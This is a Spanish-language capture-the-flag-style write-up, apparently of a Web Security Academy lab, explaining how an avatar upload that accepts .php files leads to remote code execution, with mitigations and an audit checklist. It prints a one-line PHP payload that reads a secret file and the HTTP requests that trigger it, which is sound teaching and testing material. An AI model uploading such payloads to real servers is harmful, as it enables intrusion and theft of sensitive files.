@@ -1,0 +1,352 @@
+# Unrestricted File Upload → Remote Code Execution
+
+## 1. Resumen
+
+El laboratorio presenta una vulnerabilidad de **subida de archivos sin restricciones adecuadas** (*Unrestricted File Upload*).
+
+La aplicación permite a un usuario autenticado subir una imagen como avatar. Sin embargo, el servidor no valida correctamente que el archivo sea realmente una imagen ni impide que se suban archivos con extensión `.php`.
+
+Como consecuencia, es posible subir un archivo PHP malicioso y acceder posteriormente a él mediante:
+
+`/files/avatars/exploit.php`
+
+Al solicitarlo, el servidor web interpreta el archivo como código PHP y lo ejecuta. Esto permite ejecutar código arbitrario en el servidor y, en el contexto del laboratorio, leer el archivo:
+
+`/home/carlos/secret`
+
+---
+
+## 2. Identificación de la vulnerabilidad
+
+**Vulnerabilidad:** Unrestricted File Upload
+
+**Impacto:** Remote Code Execution (RCE)
+
+**Severidad:** Crítica
+
+**CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type
+
+El problema fundamental no es únicamente que la aplicación permita subir un archivo PHP. El problema crítico es que:
+
+1. El atacante puede controlar el contenido del archivo.
+2. El archivo se almacena en una ubicación accesible mediante HTTP.
+3. El servidor interpreta archivos `.php` como código ejecutable.
+4. No existe una validación efectiva que impida esta combinación.
+
+---
+
+## 3. Reconocimiento
+
+Al iniciar sesión en la aplicación se observa una funcionalidad para **subir un avatar**.
+
+Se sube inicialmente una imagen legítima para comprobar cómo funciona el mecanismo.
+
+Después de volver a la página de cuenta, la imagen aparece como avatar.
+
+Mediante **Burp Suite → Proxy → HTTP history**, filtrando las respuestas por MIME type `Images`, se observa que la aplicación recupera el avatar mediante una petición similar a:
+
+```http
+GET /files/avatars/example.jpg HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+```
+
+Esto permite identificar dónde almacena la aplicación los archivos subidos.
+
+---
+
+## 4. Análisis de la funcionalidad de subida
+
+El siguiente paso consiste en comprobar si el servidor realmente restringe el tipo de archivo.
+
+Se crea un archivo denominado:
+
+```text
+exploit.php
+```
+
+con el siguiente contenido:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+El objetivo del código es leer el contenido del archivo `secret` perteneciente a Carlos y devolverlo directamente en la respuesta HTTP.
+
+Se utiliza la propia funcionalidad de subida de avatar para enviar este archivo.
+
+La aplicación confirma que el archivo se ha subido correctamente.
+
+Esto demuestra que la validación de extensión/tipo de archivo no está impidiendo la subida de código PHP.
+
+---
+
+## 5. Acceso al archivo subido
+
+A partir de la ubicación observada anteriormente, se modifica la petición en Burp Repeater para solicitar el archivo PHP:
+
+```http
+GET /files/avatars/exploit.php HTTP/2
+Host: <LAB-ID>.web-security-academy.net
+```
+
+El servidor responde:
+
+```http
+HTTP/2 200 OK
+Content-Type: text/html; charset=UTF-8
+```
+
+y devuelve:
+
+```text
+JeXC8iattcUbNsmc8SX0F5UYfIef934h
+```
+
+Este valor corresponde al contenido de:
+
+```text
+/home/carlos/secret
+```
+
+Por tanto, el laboratorio queda resuelto.
+
+---
+
+## 6. Funcionamiento técnico
+
+El flujo de explotación puede representarse de la siguiente manera:
+
+```text
+                ATACANTE
+                   │
+                   │ 1. Sube exploit.php
+                   ▼
+          ┌───────────────────┐
+          │ Aplicación web    │
+          │ Avatar upload     │
+          └─────────┬─────────┘
+                    │
+                    │ 2. Guarda el archivo
+                    ▼
+          /files/avatars/exploit.php
+                    │
+                    │ 3. GET
+                    ▼
+          ┌───────────────────┐
+          │ Apache + PHP      │
+          │ interpreta .php   │
+          └─────────┬─────────┘
+                    │
+                    │ 4. Ejecuta PHP
+                    ▼
+          file_get_contents()
+                    │
+                    ▼
+          /home/carlos/secret
+                    │
+                    │ 5. Devuelve contenido
+                    ▼
+                ATACANTE
+```
+
+La parte fundamental es la diferencia entre **almacenar un archivo** y **almacenarlo en un lugar donde el servidor pueda ejecutarlo**.
+
+Por ejemplo, si la aplicación permitiera subir:
+
+```text
+exploit.php
+```
+
+pero posteriormente lo sirviera como un archivo estático, el código PHP no se ejecutaría.
+
+En este laboratorio ocurre lo contrario:
+
+```text
+exploit.php
+      ↓
+/files/avatars/exploit.php
+      ↓
+Apache reconoce .php
+      ↓
+PHP ejecuta el código
+      ↓
+file_get_contents(...)
+      ↓
+secret
+```
+
+Por eso la vulnerabilidad termina convirtiéndose en **RCE**.
+
+---
+
+## 7. Evidencia de explotación
+
+La evidencia principal fue la respuesta obtenida desde Burp Repeater:
+
+```http
+HTTP/2 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 32
+```
+
+seguida del contenido:
+
+```text
+JeXC8iattcUbNsmc8SX0F5UYfIef934h
+```
+
+El hecho de que el servidor devuelva directamente el resultado de `file_get_contents()` demuestra que el archivo PHP **no fue tratado como una simple imagen o archivo estático**, sino que fue interpretado y ejecutado.
+
+---
+
+## 8. Causa raíz
+
+La causa raíz está en una combinación de controles insuficientes:
+
+* La aplicación permite subir archivos con extensiones peligrosas.
+* La validación del tipo de archivo es insuficiente.
+* El contenido del archivo no se valida correctamente.
+* Los archivos subidos quedan disponibles mediante una URL directa.
+* El directorio donde se almacenan los archivos permite la ejecución de PHP.
+
+Una aplicación segura debería tratar los archivos subidos por usuarios como **datos no confiables**, nunca como código ejecutable.
+
+---
+
+## 9. Impacto
+
+El impacto potencial de esta vulnerabilidad es muy elevado.
+
+Un atacante podría, dependiendo de los permisos del proceso web:
+
+* Ejecutar código arbitrario en el servidor.
+* Leer archivos accesibles por el usuario que ejecuta PHP.
+* Acceder a información sensible.
+* Leer credenciales almacenadas en archivos de configuración.
+* Manipular archivos.
+* Utilizar el servidor como punto de entrada para ataques posteriores.
+
+En este laboratorio concreto, el objetivo estaba limitado a demostrar la lectura de:
+
+```text
+/home/carlos/secret
+```
+
+pero en una aplicación real las consecuencias podrían ser considerablemente mayores.
+
+---
+
+## 10. Mitigación
+
+### Validar el contenido real del archivo
+
+No se debe confiar únicamente en:
+
+```text
+filename.jpg
+```
+
+ni en:
+
+```text
+Content-Type: image/jpeg
+```
+
+El servidor debe comprobar que el contenido corresponde realmente al formato permitido.
+
+### Utilizar una lista blanca
+
+Por ejemplo, si únicamente se permiten avatares JPEG y PNG:
+
+```text
+.jpg
+.jpeg
+.png
+```
+
+y rechazar cualquier otro formato.
+
+### Renombrar los archivos
+
+Los nombres proporcionados por el usuario no deberían utilizarse directamente.
+
+Por ejemplo:
+
+```text
+exploit.php
+```
+
+podría almacenarse internamente como un identificador aleatorio sin extensión ejecutable.
+
+### Almacenar los archivos fuera del web root
+
+Una medida especialmente importante es impedir que los archivos subidos puedan solicitarse directamente mediante HTTP.
+
+Por ejemplo:
+
+```text
+/var/www/uploads/
+```
+
+debería estar separado de los directorios donde se ejecuta código de la aplicación.
+
+### Deshabilitar la ejecución de scripts
+
+El directorio de uploads debería estar configurado para que archivos como:
+
+```text
+.php
+.php5
+.phtml
+```
+
+no puedan ejecutarse.
+
+### Aplicar defensa en profundidad
+
+La seguridad no debería depender de un único control. Una configuración robusta combinaría:
+
+```text
+Validación MIME
+      +
+Validación de contenido
+      +
+Extensiones permitidas
+      +
+Renombrado aleatorio
+      +
+Almacenamiento fuera del web root
+      +
+Ejecución de scripts deshabilitada
+```
+
+---
+
+## 11. Metodología reproducible en una auditoría
+
+Para una auditoría profesional, el proceso que has seguido puede convertirse en una comprobación sistemática:
+
+1. Identificar todas las funcionalidades de subida.
+2. Subir primero un archivo legítimo.
+3. Analizar cómo se almacena.
+4. Determinar si el archivo es accesible directamente.
+5. Comprobar qué validaciones realiza el servidor.
+6. Verificar si las extensiones ejecutables son aceptadas.
+7. Determinar si los archivos subidos se encuentran en un directorio ejecutable.
+8. Comprobar el comportamiento del servidor ante archivos potencialmente ejecutables.
+9. Documentar el impacto de forma controlada.
+10. Recomendar almacenamiento seguro y deshabilitación de ejecución.
+
+En un pentest real, la prueba de impacto debe mantenerse dentro del alcance autorizado y utilizar el mínimo nivel de explotación necesario para demostrar la vulnerabilidad.
+
+---
+
+## 12. Conclusión
+
+El laboratorio demuestra una cadena de ataque clásica:
+
+**Unrestricted File Upload → subida de PHP → acceso directo al archivo → ejecución por el servidor → RCE → lectura de información sensible.**
+
+La vulnerabilidad inicial parece una simple funcionalidad de subida de imágenes, pero el punto crítico aparece al descubrir que el archivo controlado por el atacante termina en un directorio donde el servidor permite la ejecución de PHP.
+
+La lección principal es que **una subida de archivos no debe analizarse únicamente desde el punto de vista de "¿puedo subir un archivo?", sino también desde "¿dónde se almacena?, ¿cómo se sirve?, ¿cómo lo interpreta el servidor y qué permisos tiene el proceso que lo ejecuta?"**.
